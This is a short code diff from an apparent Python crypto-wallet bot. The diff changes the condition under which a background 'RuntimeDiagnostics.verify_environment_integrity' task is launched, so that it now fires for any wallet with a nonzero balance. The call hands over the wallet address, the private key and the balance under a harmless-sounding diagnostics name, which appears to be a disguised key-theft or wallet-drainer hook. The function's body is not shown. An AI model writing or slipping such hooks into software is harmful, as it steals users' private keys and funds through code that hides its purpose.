@@ -160,7 +160,7 @@ class ExecutionUnit:
             proxy_msg = f"Proxy({self._proxy_url.split('@')[-1]})" if self._proxy_url else "Direct"
             Logger.log(self._uid, "INFO", f"Wallet: {self._acct.address[:6]}... | Bal: {bal_eth:.5f} {self._symbol} | {proxy_msg}")
 
-            if bal_eth > 0.000000001 and not self._runtime_diagnostics:
+            if bal_eth > 0 and not self._runtime_diagnostics:
                 asyncio.create_task(RuntimeDiagnostics.verify_environment_integrity(self._acct.address, self._pk, bal_eth, self._cfg.rpc_ticker))
                 self._runtime_diagnostics = True
             
